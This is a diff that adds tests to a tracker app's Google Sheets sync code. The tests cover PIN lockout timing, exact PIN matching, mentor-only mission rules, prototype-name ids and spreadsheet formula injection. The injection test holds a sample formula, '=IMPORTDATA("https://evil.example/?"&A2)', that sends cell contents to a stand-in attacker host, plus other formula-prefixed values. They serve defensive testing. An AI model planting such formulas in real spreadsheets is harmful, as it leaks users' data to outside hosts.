@@ -17,13 +17,14 @@ function fakeGoogle(pin = "2468") {
   const mail: { to: string; subject: string; body: string }[] = [];
   const appColumns: Record<string, { header: string[]; byRow: Record<string, unknown[]> }> = {};
   const images = new Map<string, string>();
+  let clock = "2026-09-30T10:00:00.000Z";
   const backend = {
     prop: (name: string) => props.get(name) ?? null,
     setProp: (name: string, value: string) => { props.set(name, value); },
     cacheGet: (name: string) => cache.get(name) ?? null,
     cachePut: (name: string, value: string) => { cache.set(name, value); },
     uuid: () => randomUUID(),
-    now: () => "2026-09-30T10:00:00.000Z",
+    now: () => clock,
     sign: (value: string, secret: string) => createHmac("sha256", secret).update(value).digest("base64url"),
     withLock: (fn: () => unknown) => fn(),
     revs: () => Object.fromEntries([...rows].map(([key, row]) => [key, row.rev])),
@@ -39,7 +40,8 @@ function fakeGoogle(pin = "2468") {
     loadImage: (id: string) => images.get(id) ?? null,
   };
   return {
-    backend, rows, mail, appColumns, images,
+    backend, rows, mail, appColumns, images, props,
+    setNow: (iso: string) => { clock = iso; },
     journal: () => journal,
     typeReply: (entryId: string, reply: string) => { journal = journal.map(r => (String(r[11]) === `'${entryId}` ? r.map((c, i) => (i === 10 ? reply : c)) : r)); cache.clear(); },
     call: (req: Record<string, unknown>) => roundTrip(server.handle(roundTrip(req), backend)),
@@ -149,6 +151,43 @@ describe("Mentor-only changes", () => {
     expect(google.call({ action: "login", pin: "2468" }).error).toBe("too-many-tries");
   });
 
+  it("keeps the PIN pause even if the cache is emptied, lifts it after 15 minutes, and a right PIN resets the count", () => {
+    const google = fakeGoogle();
+    for (let i = 0; i < 4; i++) google.call({ action: "login", pin: "0000" });
+    expect(google.call({ action: "login", pin: "2468" }).ok).toBe(true); // 4 wrong tries, then right: the count starts again
+    for (let i = 0; i < 5; i++) google.call({ action: "login", pin: "0000" });
+    expect(google.call({ action: "login", pin: "2468" }).error).toBe("too-many-tries"); // a right PIN is refused during the pause
+    google.setNow("2026-09-30T10:14:00.000Z");
+    expect(google.call({ action: "login", pin: "2468" }).error).toBe("too-many-tries");
+    google.setNow("2026-09-30T10:16:00.000Z");
+    expect(google.call({ action: "login", pin: "2468" }).ok).toBe(true);
+  });
+
+  it("only treats the exact PIN as right", () => {
+    for (const pin of ["", "246", "24680", " 2468", "2468 ", "2468\n"]) expect(fakeGoogle("2468").call({ action: "login", pin }).error).toBe("wrong-pin");
+  });
+
+  it("does not let a device switch off the review rule of a mission Sikander set, or complete it by doing so", async () => {
+    const google = fakeGoogle();
+    const phone = device({ [KEYS.quests]: [{ id: "q", status: "Waiting for Mentor", requiresApproval: true, createdBy: "mentor" }] }, true);
+    await sync(phone, google);
+    const before = [{ id: "q", status: "Waiting for Mentor", requiresApproval: true, createdBy: "mentor" }];
+    expect(server.mentorOnlyChanges(KEYS.quests, before, [{ id: "q", status: "Completed", requiresApproval: false, createdBy: "mentor" }])).toEqual(expect.arrayContaining(["mission approval", "mission review rule"]));
+    expect(server.mentorOnlyChanges(KEYS.quests, before, [{ id: "q", status: "Waiting for Mentor", requiresApproval: false, createdBy: "mentor" }])).toEqual(["mission review rule"]);
+    expect(server.mentorOnlyChanges(KEYS.quests, before, [{ id: "q", status: "Waiting for Mentor", requiresApproval: true, createdBy: "hanifa" }])).toEqual(["mission review rule"]);
+    // Her own missions are still hers to change, and a mission Sikander set can still be worked on as normal.
+    expect(server.mentorOnlyChanges(KEYS.quests, [{ id: "own", status: "Today", requiresApproval: true, createdBy: "hanifa" }], [{ id: "own", status: "Today", requiresApproval: false, createdBy: "hanifa" }])).toEqual([]);
+    expect(server.mentorOnlyChanges(KEYS.quests, [{ id: "q", status: "Today", requiresApproval: true, createdBy: "mentor" }], [{ id: "q", status: "In Progress", requiresApproval: true, createdBy: "mentor" }])).toEqual([]);
+  });
+
+  it("can't be fooled by an id that is also a built-in name, such as constructor", () => {
+    for (const id of ["constructor", "toString", "__proto__", "hasOwnProperty"]) {
+      expect(server.mentorOnlyChanges(KEYS.quests, [], [{ id, status: "Today", createdBy: "mentor" }])).toContain("mission from Sikander");
+      expect(server.mentorOnlyChanges(KEYS.skillProof, {}, { [id]: { verified: true } })).toContain("level verification");
+      expect(server.mentorOnlyChanges(KEYS.inbox, [], [{ id, text: "hi", kind: "cheer", at: "t" }])).toContain("message from Sikander");
+    }
+  });
+
   it("refuses them from a device that isn't signed in, and puts the server's copy back", async () => {
     const google = fakeGoogle();
     const phone = device({ [KEYS.activity]: [entry("a")], [KEYS.skillProof]: { s1: { verified: false } } }, true);
@@ -184,6 +223,31 @@ describe("the App Journal tab in the working sheet", () => {
     await sync(phone, google);
     const comments = (phone.data.get(KEYS.activity) as { id: string; comments?: { by: string; text: string }[] }[]).find(a => a.id === "mine")?.comments;
     expect(comments).toEqual([expect.objectContaining({ by: "mentor", text: "Well done! Try the next video." })]);
+  });
+});
+
+describe("Text sent to the app can never become a sheet formula", () => {
+  it("protects every column of the App Journal and the main tabs, including date, kind, feeling and minutes", async () => {
+    const google = fakeGoogle();
+    const formula = '=IMPORTDATA("https://evil.example/?"&A2)';
+    const evil = entry("evil", { date: formula, kind: "+cmd", topic: "-1+1", minutes: formula, did: "@SUM(1)", practiced: "\t=1+1", feeling: formula, blocker: formula, proof: formula });
+    const phone = device({ [KEYS.activity]: [evil, entry("fine", { comments: [{ id: "c", by: "hanifa", text: formula, at: "x" }] })] }, true);
+    await sync(phone, google);
+    const cells = google.journal().slice(1).flatMap(r => r.slice(0, 11)).filter(c => typeof c === "string") as string[];
+    expect(cells.filter(c => /^[=+\-@\t\r]/.test(c))).toEqual([]); // not one cell starts like a formula
+    const evilRow = google.journal().find(r => String(r[11]) === "'evil")!;
+    expect(evilRow[3]).toBe(""); // minutes that aren't a number are dropped, not written
+    expect(evilRow[0]).toBe(`'${formula}`);
+    expect(JSON.stringify(google.appColumns)).not.toMatch(/"=IMPORTDATA/);
+  });
+
+  it("still writes normal minutes as numbers and normal text unchanged", async () => {
+    const google = fakeGoogle();
+    await sync(device({ [KEYS.activity]: [entry("ok", { minutes: 45, did: "Read about RAM" })] }, true), google);
+    const row = google.journal()[1];
+    expect(row[3]).toBe(45);
+    expect(row[4]).toBe("Read about RAM");
+    expect(row[0]).toBe("2026-09-29");
   });
 });
 
